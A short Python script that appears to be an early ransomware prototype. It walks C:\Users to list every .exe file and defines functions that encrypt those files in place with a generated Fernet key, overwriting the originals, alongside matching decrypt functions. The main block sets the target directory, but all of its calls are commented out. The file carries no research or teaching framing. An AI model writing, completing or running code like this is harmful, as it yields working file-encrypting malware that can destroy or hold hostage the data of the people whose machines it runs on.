import os 
from cryptography.fernet import Fernet
import ctypes

def search_and_save_files(root_directory, output_file):
    file_dict = {}
    
    for foldername, subfolders, filenames in os.walk(root_directory):
        for filename in filenames:
            if filename.endswith('.exe'):
                file_path = os.path.join(foldername, filename)
                file_dict[filename] = file_path

    with open(output_file, 'w') as f:
        for filename, file_path in file_dict.items():
            f.write(f"{filename}: {file_path}\n")

def read_dictionary_from_file(filename, delimiter=':'):
    data = {}
    try:
        with open(filename, 'r') as file:
            for line in file:
                line = line.strip()
                if line:
                    key, value = line.split(delimiter, 1)
                    data[key.strip()] = value.strip()
        return data
    except FileNotFoundError:
        print(f"File '{filename}' not found.")
        return None

def generate_key():
    return Fernet.generate_key()

def encrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        data = file.read()
    fernet = Fernet(key)
    encrypted_data = fernet.encrypt(data)
    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

# Encrypt all files in the dictionary using the provided key
def encrypt_files(file_dict, encryption_key):
    for file_path in file_dict.values():
        encrypt_file(file_path, encryption_key)

def decrypt_file(file_path, key):
    with open(file_path, 'rb') as file:
        encrypted_data = file.read()
    fernet = Fernet(key)
    decrypted_data = fernet.decrypt(encrypted_data)
    with open(file_path, 'wb') as file:
        file.write(decrypted_data)

# Decrypt all files in the dictionary using the provided key
def decrypt_files(file_dict, encryption_key):
    for file_path in file_dict.values():
        decrypt_file(file_path, encryption_key)


if __name__ == "__main__":
    root_directory = "C:\\Users"
    output_file = 'file_list.txt'  # Replace with the desired output file name
    
    #search_and_save_files(root_directory, output_file)
    #print("File list saved to", output_file)
    #dictionary = read_dictionary_from_file(output_file)
    #if dictionary:
    #    print("Dictionary read successfully:")
    #    print(dictionary)
